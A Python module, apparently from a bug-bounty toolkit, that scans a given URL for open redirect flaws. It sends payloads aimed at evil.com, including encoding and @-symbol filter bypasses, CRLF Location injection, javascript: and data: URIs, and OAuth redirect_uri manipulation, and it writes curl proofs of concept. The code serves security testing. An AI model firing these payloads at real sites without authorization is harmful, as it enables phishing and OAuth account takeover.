"""
Open Redirect Tester Agent

Comprehensive open redirect vulnerability detection and exploitation agent.

Tests for:
- Parameter-based redirects (redirect, return_to, next, url, etc.)
- Header-based redirects (Referer, X-Forwarded-Host, Host)
- Meta refresh redirects
- JavaScript location redirects
- OAuth redirect_uri bypass
- SAML RelayState bypass
- Protocol-based bypass (javascript:, data:, file:)
- Filter evasion (encoding, @ symbol, subdomain, path traversal)
- CRLF injection in redirects
- Null byte injection
- Whitespace/tab injection

Author: BountyHound Team
Version: 3.0.0
"""

from engine.core.tool_bridge import sync_nuclei_scan, sync_nmap_scan, sync_ffuf_fuzz, sync_sqlmap_test, sync_amass_enum, sync_gobuster_enum, sync_bloodhound_enum, sync_metasploit_execute, sync_nessus_scan, sync_volatility_analyze, sync_zeek_analyze
import re
import time
import urllib.parse
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from datetime import datetime
from urllib.parse import urlparse, quote, urlencode, parse_qs
from enum import Enum


try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    from colorama import Fore, Style
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False
    # Fallback dummy classes
    class Fore:
        CYAN = RED = GREEN = YELLOW = MAGENTA = BLUE = ""
    class Style:
        RESET_ALL = ""

# Database integration
from engine.core.db_hooks import DatabaseHooks
from engine.core.database import BountyHoundDB
from engine.core.payload_hooks import PayloadHooks


class RedirectType(Enum):
    """Redirect vulnerability types"""
    PARAMETER = "parameter"
    HEADER = "header"
    META_REFRESH = "meta_refresh"
    JAVASCRIPT = "javascript"
    OAUTH = "oauth"
    SAML = "saml"
    REFERER = "referer"


class RedirectMethod(Enum):
    """HTTP redirect methods"""
    HTTP_302 = "302_found"
    HTTP_301 = "301_moved"
    HTTP_303 = "303_see_other"
    HTTP_307 = "307_temporary"
    HTTP_308 = "308_permanent"
    META_TAG = "meta_refresh"
    JAVASCRIPT = "js_location"


@dataclass
class RedirectPayload:
    """Open redirect payload"""
    payload: str
    redirect_type: RedirectType
    bypass_technique: str
    description: str
    expected_behavior: str


@dataclass
class RedirectFinding:
    """Open redirect finding"""
    url: str
    parameter: str
    redirect_type: RedirectType
    redirect_method: RedirectMethod
    payload: str
    final_destination: str
    bypass_technique: str
    severity: str
    impact: str
    exploitation_steps: List[str]
    chain_potential: List[str]
    poc: str
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

    def to_dict(self) -> Dict:
        """Convert finding to dictionary"""
        return {
            'url': self.url,
            'parameter': self.parameter,
            'redirect_type': self.redirect_type.value,
            'redirect_method': self.redirect_method.value,
            'payload': self.payload,
            'final_destination': self.final_destination,
            'bypass_technique': self.bypass_technique,
            'severity': self.severity,
            'impact': self.impact,
            'exploitation_steps': self.exploitation_steps,
            'chain_potential': self.chain_potential,
            'poc': self.poc,
            'timestamp': self.timestamp
        }


class PayloadGenerator:
    """Generates open redirect payloads"""

    def __init__(self, attacker_domain: str = "evil.com"):
        self.attacker_domain = attacker_domain
        self.protocols = ['https', 'http']

    def generate_basic_payloads(self) -> List[RedirectPayload]:
        """Generate basic redirect payloads"""
        payloads = []

        # Absolute URL
        for proto in self.protocols:
            payloads.append(RedirectPayload(
                payload=f"{proto}://{self.attacker_domain}",
                redirect_type=RedirectType.PARAMETER,
                bypass_technique="absolute_url",
                description="Basic absolute URL redirect",
                expected_behavior="302/301 redirect to attacker domain"
            ))

        # Protocol-relative URL
        payloads.extend([
            RedirectPayload(
                payload=f"//{self.attacker_domain}",
                redirect_type=RedirectType.PARAMETER,
                bypass_technique="protocol_relative",
                description="Protocol-relative URL (inherits current protocol)",
                expected_behavior="Redirect to attacker domain with same protocol"
            ),
            RedirectPayload(
                payload=f"///{self.attacker_domain}",
                redirect_type=RedirectType.PARAMETER,
                bypass_technique="triple_slash",
                description="Triple slash protocol-relative",
                expected_behavior="Redirect to attacker domain"
            ),
            RedirectPayload(
                payload=f"////{self.attacker_domain}",
                redirect_type=RedirectType.PARAMETER,
                bypass_technique="quad_slash",
                description="Quad slash bypass",
                expected_behavior="Redirect to attacker domain"
            )
        ])

        # Relative path (may upgrade to external)
        payloads.extend([
            RedirectPayload(
                payload=f"/{self.attacker_domain}",
                redirect_type=RedirectType.PARAMETER,
                bypass_technique="relative_path",
                description="Relative path that may be misinterpreted",
                expected_behavior="Should stay on site, but may redirect externally"
            ),
            RedirectPayload(
                payload=f"./{self.attacker_domain}",
                redirect_type=RedirectType.PARAMETER,
                bypass_technique="dot_relative",
                description="Dot-relative path",
                expected_behavior="May redirect externally if not validated"
            )
        ])

        return payloads

    def generate_filter_bypass_payloads(self, legitimate_domain: str) -> List[RedirectPayload]:
        """Generate filter bypass payloads"""
        payloads = []

        # @ symbol bypass (user info)
        payloads.extend([
            RedirectPayload(
                payload=f"https://{legitimate_domain}@{self.attacker_domain}",
                redirect_type=RedirectType.PARAMETER,
                bypass_technique="at_symbol",
                description="User info section bypass (legitimate_domain is username)",
                expected_behavior="Redirects to attacker domain despite legitimate domain in URL"
            ),
            RedirectPayload(
                payload=f"https://{legitimate_domain}:{legitimate_domain}@{self.attacker_domain}",
                redirect_type=RedirectType.PARAMETER,
                bypass_technique="credentials_bypass",
                description="Username:password bypass",
                expected_behavior="Redirects to attacker domain"
            )
        ])

        # Subdomain bypass
        payloads.extend([
            RedirectPayload(
                payload=f"https://{legitimate_domain}.{self.attacker_domain}",
                redirect_type=RedirectType.PARAMETER,
                bypass_technique="subdomain_append",
                description="Legitimate domain as subdomain",
                expected_behavior="Redirects to attacker-controlled subdomain"
            ),
            RedirectPayload(
                payload=f"https://{self.attacker_domain}/{legitimate_domain}",
                redirect_type=RedirectType.PARAMETER,
                bypass_technique="path_append",
                description="Legitimate domain in path",
                expected_behavior="Redirects to attacker domain"
            )
        ])

        # Encoding bypasses
        payloads.extend([
            RedirectPayload(
                payload=f"https://{self._url_encode(self.attacker_domain)}",
                redirect_type=RedirectType.PARAMETER,
                bypass_technique="url_encoding",
                description="URL-encoded domain",
                expected_behavior="Decoded and redirected"
            ),
            RedirectPayload(
                payload=f"https://{self._double_encode(self.attacker_domain)}",
                redirect_type=RedirectType.PARAMETER,
                bypass_technique="double_encoding",
                description="Double URL-encoded domain",
                expected_behavior="Decoded twice and redirected"
            ),
            RedirectPayload(
                payload=f"https://{self._unicode_encode(self.attacker_domain)}",
                redirect_type=RedirectType.PARAMETER,
                bypass_technique="unicode_encoding",
                description="Unicode-encoded domain",
                expected_behavior="Normalized and redirected"
            )
        ])

        # Backslash bypass (Windows path parsing)
        payloads.extend([
            RedirectPayload(
                payload=f"https://{legitimate_domain}\\{self.attacker_domain}",
                redirect_type=RedirectType.PARAMETER,
                bypass_technique="backslash",
                description="Backslash path separator (Windows)",
                expected_behavior="May redirect to attacker domain on Windows servers"
            ),
            RedirectPayload(
                payload=f"https://{legitimate_domain}\\\\{self.attacker_domain}",
                redirect_type=RedirectType.PARAMETER,
                bypass_technique="double_backslash",
                description="Double backslash",
                expected_behavior="Redirect to attacker domain"
            )
        ])

        # Whitespace bypass
        payloads.extend([
            RedirectPayload(
                payload=f"https://{legitimate_domain}%20{self.attacker_domain}",
                redirect_type=RedirectType.PARAMETER,
                bypass_technique="space_injection",
                description="Space between domains",
                expected_behavior="Parser may ignore legitimate domain"
            ),
            RedirectPayload(
                payload=f"https://{legitimate_domain}%09{self.attacker_domain}",
                redirect_type=RedirectType.PARAMETER,
                bypass_technique="tab_injection",
                description="Tab character between domains",
                expected_behavior="Parser may treat tab as delimiter"
            )
        ])

        # Null byte injection
        payloads.append(RedirectPayload(
            payload=f"https://{legitimate_domain}%00{self.attacker_domain}",
            redirect_type=RedirectType.PARAMETER,
            bypass_technique="null_byte",
            description="Null byte injection",
            expected_behavior="String truncation at null byte"
        ))

        # CRLF injection
        payloads.append(RedirectPayload(
            payload=f"https://{legitimate_domain}%0d%0aLocation:%20https://{self.attacker_domain}",
            redirect_type=RedirectType.PARAMETER,
            bypass_technique="crlf_injection",
            description="CRLF injection to inject Location header",
            expected_behavior="Additional Location header injected"
        ))

        return payloads

    def generate_protocol_bypass_payloads(self) -> List[RedirectPayload]:
        """Generate protocol-based bypass payloads"""
        payloads = []

        # JavaScript protocol
        payloads.extend([
            RedirectPayload(
                payload=f"javascript:window.location='https://{self.attacker_domain}'",
                redirect_type=RedirectType.JAVASCRIPT,
                bypass_technique="javascript_protocol",
                description="JavaScript protocol handler",
                expected_behavior="Execute JavaScript that redirects"
            ),
            RedirectPayload(
                payload=f"javascript:location.href='https://{self.attacker_domain}'",
                redirect_type=RedirectType.JAVASCRIPT,
                bypass_technique="javascript_location",
                description="JavaScript location change",
                expected_behavior="Redirect via JavaScript"
            )
        ])

        # Data protocol
        payloads.append(RedirectPayload(
            payload=f"data:text/html,<meta http-equiv='refresh' content='0;url=https://{self.attacker_domain}'>",
            redirect_type=RedirectType.META_REFRESH,
            bypass_technique="data_protocol",
            description="Data URI with meta refresh",
            expected_behavior="Load data URI then redirect"
        ))

        # VBScript (IE only, legacy)
        payloads.append(RedirectPayload(
            payload=f"vbscript:window.location='https://{self.attacker_domain}'",
            redirect_type=RedirectType.JAVASCRIPT,
            bypass_technique="vbscript_protocol",
            description="VBScript protocol (IE legacy)",
            expected_behavior="Execute VBScript redirect (IE only)"
        ))

        return payloads

    def generate_oauth_payloads(self, client_id: str) -> List[RedirectPayload]:
        """Generate OAuth-specific redirect payloads"""
        payloads = []

        # redirect_uri manipulation
        payloads.extend([
            RedirectPayload(
                payload=f"https://{self.attacker_domain}/callback",
                redirect_type=RedirectType.OAUTH,
                bypass_technique="oauth_redirect_uri",
                description="Direct attacker redirect_uri",
                expected_behavior="OAuth authorization code sent to attacker"
            ),
            RedirectPayload(
                payload=f"https://{self.attacker_domain}?client_id={client_id}",
                redirect_type=RedirectType.OAUTH,
                bypass_technique="oauth_state_bypass",
                description="OAuth redirect without state validation",
                expected_behavior="CSRF in OAuth flow"
            )
        ])

        # Path traversal in redirect_uri
        payloads.extend([
            RedirectPayload(
                payload=f"https://legitimate.com/../../../{self.attacker_domain}",
                redirect_type=RedirectType.OAUTH,
                bypass_technique="path_traversal",
                description="Path traversal in OAuth redirect",
                expected_behavior="Escape to attacker domain"
            ),
            RedirectPayload(
                payload=f"https://legitimate.com@{self.attacker_domain}",
                redirect_type=RedirectType.OAUTH,
                bypass_technique="oauth_at_symbol",
                description="@ symbol in OAuth redirect_uri",
                expected_behavior="Redirect to attacker domain with auth code"
            )
        ])

        return payloads

    def _url_encode(self, text: str) -> str:
        """URL encode text"""
        return ''.join(f'%{ord(c):02x}' for c in text)

    def _double_encode(self, text: str) -> str:
        """Double URL encode text"""
        return ''.join(f'%25{ord(c):02x}' for c in text)

    def _unicode_encode(self, text: str) -> str:
        """Unicode encode text using alternative representations"""
        # Use fullwidth dot (。) instead of regular dot
        return text.replace('.', '\u3002')


class RedirectAnalyzer:
    """Analyzes redirect responses"""

    def analyze_response(self, response: Any, original_url: str, payload: str) -> Optional[Dict]:
        """Analyze response for redirect"""
        result = {
            'redirected': False,
            'method': None,
            'destination': None,
            'chain': [],
            'final_destination': None
        }

        # Check HTTP status code
        if response.status_code in [301, 302, 303, 307, 308]:
            result['redirected'] = True
            result['method'] = self._status_to_method(response.status_code)
            result['destination'] = response.headers.get('Location', '')
            result['final_destination'] = response.url

            # Analyze redirect chain
            if hasattr(response, 'history'):
                result['chain'] = [
                    {
                        'status': r.status_code,
                        'location': r.headers.get('Location', ''),
                        'url': r.url
                    }
                    for r in response.history
                ]

        # Check for meta refresh
        meta_match = re.search(
            r'<meta[^>]+http-equiv=["\']refresh["\'][^>]+content=["\'](\d+);url=([^"\']+)["\']',
            response.text,
            re.IGNORECASE
        )
        if meta_match:
            result['redirected'] = True
            result['method'] = RedirectMethod.META_TAG
            result['destination'] = meta_match.group(2)

        # Check for JavaScript redirect
        js_patterns = [
            r'window\.location\s*=\s*["\']([^"\']+)["\']',
            r'window\.location\.href\s*=\s*["\']([^"\']+)["\']',
            r'window\.location\.replace\(["\']([^"\']+)["\']\)',
            r'document\.location\s*=\s*["\']([^"\']+)["\']',
            r'location\.href\s*=\s*["\']([^"\']+)["\']',
        ]

        for pattern in js_patterns:
            js_match = re.search(pattern, response.text, re.IGNORECASE)
            if js_match:
                result['redirected'] = True
                result['method'] = RedirectMethod.JAVASCRIPT
                result['destination'] = js_match.group(1)
                break

        return result if result['redirected'] else None

    def is_external_redirect(self, original_domain: str, redirect_destination: str) -> bool:
        """Check if redirect is to external domain"""
        try:
            # Parse both URLs
            original_parsed = urlparse(original_domain if '://' in original_domain else f'https://{original_domain}')
            redirect_parsed = urlparse(redirect_destination if '://' in redirect_destination else f'https://{redirect_destination}')

            original_host = original_parsed.netloc or original_parsed.path.split('/')[0]
            redirect_host = redirect_parsed.netloc or redirect_parsed.path.split('/')[0]

            # Check if domains differ
            if redirect_host and redirect_host != original_host:
                # Check if it's not a subdomain
                if not redirect_host.endswith('.' + original_host):
                    return True

        except Exception:
            pass

        return False

    def _status_to_method(self, status_code: int) -> RedirectMethod:
        """Convert status code to redirect method"""
        mapping = {
            301: RedirectMethod.HTTP_301,
            302: RedirectMethod.HTTP_302,
            303: RedirectMethod.HTTP_303,
            307: RedirectMethod.HTTP_307,
            308: RedirectMethod.HTTP_308
        }
        return mapping.get(status_code, RedirectMethod.HTTP_302)


class OpenRedirectTester:
    """
    Main open redirect testing agent.

    Comprehensive testing for open redirect vulnerabilities including:
    - Parameter-based redirects
    - Header-based redirects (Referer, X-Forwarded-Host, Host)
    - OAuth/SAML redirect bypass
    - Filter evasion techniques
    - Protocol-based bypass
    """

    def __init__(self, target: Optional[str] = None, timeout: int = 10,
                 attacker_domain: str = "evil.com", session: Optional[Any] = None):
        """
        Initialize open redirect tester.

        Args:
            target: Target domain for database tracking (default: auto-detect)
            timeout: Request timeout in seconds
            attacker_domain: Attacker-controlled domain for testing
            session: Requests session (optional)
        """
        self.target = target
        self.timeout = timeout
        self.attacker_domain = attacker_domain
        self.session = session or (requests.Session() if REQUESTS_AVAILABLE else None)
        self.payload_gen = PayloadGenerator(attacker_domain)
        self.analyzer = RedirectAnalyzer()
        self.findings: List[RedirectFinding] = []
        self.tests_run = 0
        self.tests_passed = 0

        # Common redirect parameter names
        self.redirect_params = [
            'redirect', 'redirect_uri', 'redirect_url', 'redirectUrl',
            'return', 'return_to', 'returnTo', 'return_url', 'returnUrl',
            'next', 'next_url', 'nextUrl',
            'url', 'target', 'destination', 'dest',
            'continue', 'continueUrl',
            'callback', 'callback_url', 'callbackUrl',
            'out', 'forward', 'goto', 'go', 'redir',
            'RelayState', 'SAMLRequest'
        ]

    def test_url(self, url: str, parameters: Optional[Dict[str, str]] = None) -> List[RedirectFinding]:
        """
        Test URL for open redirect vulnerabilities.

        Args:
            url: Target URL to test
            parameters: Optional existing parameters to test

        Returns:
            List of findings
        """
        if not REQUESTS_AVAILABLE:
            print(f"{Fore.RED}[ERROR] requests library not available{Style.RESET_ALL}")
            return []

        # Auto-detect target if not set
        if not self.target:
            parsed = urlparse(url)
            self.target = parsed.netloc

        # Database check
        print(f"{Fore.CYAN}[DATABASE] Checking history for {self.target}...{Style.RESET_ALL}")
        context = DatabaseHooks.before_test(self.target, 'open_redirect_tester')

        if context['should_skip']:
            print(f"{Fore.YELLOW}[SKIP] {context['reason']}{Style.RESET_ALL}")
            if context.get('previous_findings'):
                print(f"Previous findings: {len(context['previous_findings'])}")
            return []
        else:
            print(f"{Fore.GREEN}[OK] {context['reason']}{Style.RESET_ALL}")

        print(f"{Fore.CYAN}[*] Testing {url} for open redirects...{Style.RESET_ALL}")

        # Extract domain for bypass payloads
        parsed = urlparse(url)
        legitimate_domain = parsed.netloc

        # Test existing parameters
        if parameters:
            self._test_parameters(url, parameters, legitimate_domain)

        # Test common redirect parameter names
        self._test_common_params(url, legitimate_domain)

        # Test header-based redirects
        self._test_header_redirects(url)

        # Test OAuth redirects if applicable
        if self._is_oauth_endpoint(url):
            self._test_oauth_redirects(url)

        # Record test run
        db = BountyHoundDB()
        db.record_tool_run(
            self.target,
            'open_redirect_tester',
            findings_count=len(self.findings),
            duration_seconds=0  # TODO: track actual duration
        )

        return self.findings

    def _test_parameters(self, url: str, parameters: Dict, legitimate_domain: str):
        """Test existing parameters for redirect"""
        print(f"{Fore.CYAN}[*] Testing existing parameters...{Style.RESET_ALL}")

        # Generate all payload types
        basic_payloads = self.payload_gen.generate_basic_payloads()
        bypass_payloads = self.payload_gen.generate_filter_bypass_payloads(legitimate_domain)
        protocol_payloads = self.payload_gen.generate_protocol_bypass_payloads()

        all_payloads = basic_payloads + bypass_payloads + protocol_payloads

        for param_name, param_value in parameters.items():
            # Skip non-URL-like parameters
            if not self._looks_like_url_param(param_name, param_value):
                continue

            print(f"[*] Testing parameter: {param_name}")

            for payload_obj in all_payloads:
                test_params = parameters.copy()
                test_params[param_name] = payload_obj.payload

                # Send request
                try:
                    self.tests_run += 1
                    response = self.session.get(
                        url,
                        params=test_params,
                        allow_redirects=True,
                        timeout=self.timeout
                    )

                    # Analyze response
                    redirect_info = self.analyzer.analyze_response(response, url, payload_obj.payload)

                    if redirect_info and redirect_info['redirected']:
                        # Check if redirect is to attacker domain
                        dest = redirect_info['destination'] or redirect_info['final_destination']
                        if dest and self.analyzer.is_external_redirect(legitimate_domain, dest):
                            # Check if it's to our attacker domain
                            if self.attacker_domain in dest:
                                self.tests_passed += 1
                                self._add_finding(
                                    url=url,
                                    parameter=param_name,
                                    payload_obj=payload_obj,
                                    redirect_info=redirect_info,
                                    legitimate_domain=legitimate_domain
                                )
                                print(f"{Fore.GREEN}[+] Open redirect found: {param_name} -> {dest}{Style.RESET_ALL}")

                except Exception as e:
                    pass

                time.sleep(0.1)

    def _test_common_params(self, url: str, legitimate_domain: str):
        """Test common redirect parameter names"""
        print(f"{Fore.CYAN}[*] Testing common redirect parameters...{Style.RESET_ALL}")

        basic_payloads = self.payload_gen.generate_basic_payloads()[:5]  # Test subset

        for param_name in self.redirect_params:
            for payload_obj in basic_payloads:
                try:
                    self.tests_run += 1
                    response = self.session.get(
                        url,
                        params={param_name: payload_obj.payload},
                        allow_redirects=True,
                        timeout=self.timeout
                    )

                    redirect_info = self.analyzer.analyze_response(response, url, payload_obj.payload)

                    if redirect_info and redirect_info['redirected']:
                        dest = redirect_info['destination'] or redirect_info['final_destination']
                        if dest and self.analyzer.is_external_redirect(legitimate_domain, dest):
                            if self.attacker_domain in dest:
                                self.tests_passed += 1
                                self._add_finding(
                                    url=url,
                                    parameter=param_name,
                                    payload_obj=payload_obj,
                                    redirect_info=redirect_info,
                                    legitimate_domain=legitimate_domain
                                )
                                print(f"{Fore.GREEN}[+] Open redirect found: {param_name}{Style.RESET_ALL}")

                except Exception:
                    pass

                time.sleep(0.1)

    def _test_header_redirects(self, url: str):
        """Test header-based redirects"""
        print(f"{Fore.CYAN}[*] Testing header-based redirects...{Style.RESET_ALL}")

        # Test Referer header
        try:
            self.tests_run += 1
            response = self.session.get(
                url,
                headers={'Referer': f'https://{self.attacker_domain}'},
                allow_redirects=True,
                timeout=self.timeout
            )

            redirect_info = self.analyzer.analyze_response(response, url, f'https://{self.attacker_domain}')

            if redirect_info and redirect_info['redirected']:
                dest = redirect_info['destination'] or redirect_info['final_destination']
                if dest and self.attacker_domain in dest:
                    self.tests_passed += 1
                    finding = RedirectFinding(
                        url=url,
                        parameter="Referer header",
                        redirect_type=RedirectType.REFERER,
                        redirect_method=redirect_info['method'],
                        payload=f'https://{self.attacker_domain}',
                        final_destination=dest,
                        bypass_technique="header_injection",
                        severity="medium",
                        impact="Referer-based redirect can be abused for phishing",
                        exploitation_steps=[
                            "1. Set Referer header to attacker domain",
                            "2. Application redirects based on Referer",
                            "3. User redirected to attacker site"
                        ],
                        chain_potential=["SSRF", "OAuth token theft"],
                        poc=f"curl -L '{url}' -H 'Referer: https://{self.attacker_domain}'"
                    )
                    self.findings.append(finding)
                    print(f"{Fore.GREEN}[+] Referer-based redirect found{Style.RESET_ALL}")

        except Exception:
            pass

        # Test X-Forwarded-Host
        try:
            self.tests_run += 1
            response = self.session.get(
                url,
                headers={'X-Forwarded-Host': self.attacker_domain},
                allow_redirects=True,
                timeout=self.timeout
            )

            if self.attacker_domain in response.text:
                self.tests_passed += 1
                print(f"{Fore.BLUE}[+] X-Forwarded-Host injection detected{Style.RESET_ALL}")

        except Exception:
            pass

        # Test Host header
        try:
            self.tests_run += 1
            response = self.session.get(
                url,
                headers={'Host': self.attacker_domain},
                allow_redirects=False,
                timeout=self.timeout
            )

            if response.status_code in [301, 302] and self.attacker_domain in response.headers.get('Location', ''):
                self.tests_passed += 1
                finding = RedirectFinding(
                    url=url,
                    parameter="Host header",
                    redirect_type=RedirectType.HEADER,
                    redirect_method=self.analyzer._status_to_method(response.status_code),
                    payload=self.attacker_domain,
                    final_destination=response.headers.get('Location', ''),
                    bypass_technique="host_header_injection",
                    severity="high",
                    impact="Host header injection leading to redirect can enable password reset poisoning",
                    exploitation_steps=[
                        "1. Inject Host header with attacker domain",
                        "2. Application uses Host in redirect",
                        "3. Can poison password reset links"
                    ],
                    chain_potential=["Password reset poisoning", "Session fixation", "Cache poisoning"],
                    poc=f"curl -H 'Host: {self.attacker_domain}' '{url}'"
                )
                self.findings.append(finding)
                print(f"{Fore.GREEN}[+] Host header redirect found{Style.RESET_ALL}")

        except Exception:
            pass

    def _test_oauth_redirects(self, url: str):
        """Test OAuth-specific redirect vulnerabilities"""
        print(f"{Fore.CYAN}[*] Testing OAuth redirects...{Style.RESET_ALL}")

        # Extract client_id if present
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        client_id = query_params.get('client_id', ['test_client'])[0]

        oauth_payloads = self.payload_gen.generate_oauth_payloads(client_id)

        for payload_obj in oauth_payloads:
            try:
                self.tests_run += 1
                # Test redirect_uri parameter
                test_url = url
                if 'redirect_uri' in url:
                    # Replace existing redirect_uri
                    test_url = re.sub(
                        r'redirect_uri=[^&]+',
                        f'redirect_uri={quote(payload_obj.payload)}',
                        url
                    )
                else:
                    # Add redirect_uri parameter
                    separator = '&' if '?' in url else '?'
                    test_url = f"{url}{separator}redirect_uri={quote(payload_obj.payload)}"

                response = self.session.get(
                    test_url,
                    allow_redirects=True,
                    timeout=self.timeout
                )

                redirect_info = self.analyzer.analyze_response(response, url, payload_obj.payload)

                if redirect_info and redirect_info['redirected']:
                    dest = redirect_info['destination'] or redirect_info['final_destination']
                    if dest and self.attacker_domain in dest:
                        self.tests_passed += 1
                        finding = RedirectFinding(
                            url=url,
                            parameter="redirect_uri",
                            redirect_type=RedirectType.OAUTH,
                            redirect_method=redirect_info['method'],
                            payload=payload_obj.payload,
                            final_destination=dest,
                            bypass_technique=payload_obj.bypass_technique,
                            severity="critical",
                            impact="OAuth redirect_uri manipulation allows authorization code theft",
                            exploitation_steps=[
                                "1. Craft malicious OAuth URL with attacker redirect_uri",
                                "2. Victim authorizes application",
                                "3. Authorization code sent to attacker domain",
                                "4. Attacker exchanges code for access token",
                                "5. Full account takeover"
                            ],
                            chain_potential=["Account takeover", "Token theft", "OAuth bypass"],
                            poc=test_url
                        )
                        self.findings.append(finding)
                        print(f"{Fore.RED}[!] CRITICAL: OAuth redirect_uri bypass found{Style.RESET_ALL}")

            except Exception:
                pass

            time.sleep(0.1)

    def _is_oauth_endpoint(self, url: str) -> bool:
        """Check if URL is an OAuth endpoint"""
        oauth_indicators = [
            '/oauth', '/authorize', '/auth',
            'client_id=', 'redirect_uri=',
            '/connect', '/login/oauth'
        ]

        url_lower = url.lower()
        return any(indicator in url_lower for indicator in oauth_indicators)

    def _looks_like_url_param(self, param_name: str, param_value: str) -> bool:
        """Check if parameter looks like it contains a URL"""
        url_indicators = [
            'redirect', 'return', 'next', 'url', 'target',
            'callback', 'continue', 'forward', 'goto', 'out'
        ]

        param_lower = param_name.lower()

        # Check parameter name
        if any(indicator in param_lower for indicator in url_indicators):
            return True

        # Check parameter value
        if param_value:
            value_lower = param_value.lower()
            if any(proto in value_lower for proto in ['http://', 'https://', '//']):
                return True
            if value_lower.startswith('/') and len(value_lower) > 1:
                return True

        return False

    def _add_finding(self, url: str, parameter: str, payload_obj: RedirectPayload,
                    redirect_info: Dict, legitimate_domain: str):
        """Add redirect finding"""
        # Determine severity
        severity = self._determine_severity(payload_obj, redirect_info)

        # Determine chain potential
        chain_potential = self._determine_chain_potential(payload_obj, url)

        finding = RedirectFinding(
            url=url,
            parameter=parameter,
            redirect_type=payload_obj.redirect_type,
            redirect_method=redirect_info['method'],
            payload=payload_obj.payload,
            final_destination=redirect_info['final_destination'] or redirect_info['destination'],
            bypass_technique=payload_obj.bypass_technique,
            severity=severity,
            impact=self._determine_impact(payload_obj, url),
            exploitation_steps=[
                "1. Craft malicious URL with attacker domain",
                "2. Send to victim (phishing, social engineering)",
                "3. Victim clicks trusted domain",
                "4. Redirected to attacker-controlled site",
                "5. Credential harvesting or malware delivery"
            ],
            chain_potential=chain_potential,
            poc=self._generate_poc(url, parameter, payload_obj)
        )

        self.findings.append(finding)

    def _determine_severity(self, payload_obj: RedirectPayload, redirect_info: Dict) -> str:
        """Determine finding severity"""
        if payload_obj.redirect_type == RedirectType.OAUTH:
            return "critical"
        elif payload_obj.redirect_type == RedirectType.HEADER:
            return "high"
        elif payload_obj.bypass_technique in ['crlf_injection', 'javascript_protocol']:
            return "high"
        else:
            return "medium"

    def _determine_chain_potential(self, payload_obj: RedirectPayload, url: str) -> List[str]:
        """Determine potential for chaining with other attacks"""
        potential = ["Phishing"]

        if payload_obj.redirect_type == RedirectType.OAUTH:
            potential.extend(["OAuth token theft", "Account takeover"])

        if 'login' in url.lower() or 'auth' in url.lower():
            potential.append("Credential harvesting")

        if payload_obj.redirect_type == RedirectType.HEADER:
            potential.extend(["SSRF", "Cache poisoning"])

        if payload_obj.bypass_technique == 'crlf_injection':
            potential.extend(["XSS", "Header injection"])

        return potential

    def _determine_impact(self, payload_obj: RedirectPayload, url: str) -> str:
        """Determine impact description"""
        if payload_obj.redirect_type == RedirectType.OAUTH:
            return "OAuth redirect bypass allows stealing authorization codes, leading to full account takeover"
        elif payload_obj.redirect_type == RedirectType.HEADER:
            return "Header-based redirect can enable password reset poisoning and cache poisoning attacks"
        else:
            return "Open redirect enables sophisticated phishing attacks using trusted domain"

    def _generate_poc(self, url: str, parameter: str, payload_obj: RedirectPayload) -> str:
        """Generate proof of concept"""
        if payload_obj.redirect_type == RedirectType.HEADER:
            return f"curl -L '{url}' -H '{parameter}: {payload_obj.payload}'"
        else:
            separator = '&' if '?' in url else '?'
            return f"{url}{separator}{parameter}={quote(payload_obj.payload)}"

    def get_statistics(self) -> Dict[str, Any]:
        """Get testing statistics"""
        return {
            'tests_run': self.tests_run,
            'tests_passed': self.tests_passed,
            'total_findings': len(self.findings),
            'critical': len([f for f in self.findings if f.severity == 'critical']),
            'high': len([f for f in self.findings if f.severity == 'high']),
            'medium': len([f for f in self.findings if f.severity == 'medium']),
            'oauth_redirects': len([f for f in self.findings if f.redirect_type == RedirectType.OAUTH]),
            'header_redirects': len([f for f in self.findings if f.redirect_type == RedirectType.HEADER])
        }


# Integration with BountyHound
def run_open_redirect_tests(target_url: str, parameters: Optional[Dict[str, str]] = None) -> Dict:
    """
    Run open redirect tests on target.

    Args:
        target_url: URL to test
        parameters: Optional dictionary of parameters

    Returns:
        Dictionary with findings and statistics
    """
    tester = OpenRedirectTester(timeout=10, attacker_domain='evil.com')
    findings = tester.test_url(target_url, parameters)

    return {
        'findings': [f.to_dict() for f in findings],
        'stats': tester.get_statistics()
    }


if __name__ == "__main__":
    # Example usage
    import sys

    if len(sys.argv) < 2:
        print("Usage: python open_redirect_tester.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    result = run_open_redirect_tests(url)

    print(f"\n{Fore.CYAN}=== OPEN REDIRECT TEST RESULTS ==={Style.RESET_ALL}")
    print(f"Total findings: {result['stats']['total_findings']}")
    print(f"Critical: {result['stats']['critical']}")
    print(f"High: {result['stats']['high']}")
    print(f"Medium: {result['stats']['medium']}")
    print(f"\nTests run: {result['stats']['tests_run']}")
    print(f"Tests passed: {result['stats']['tests_passed']}")
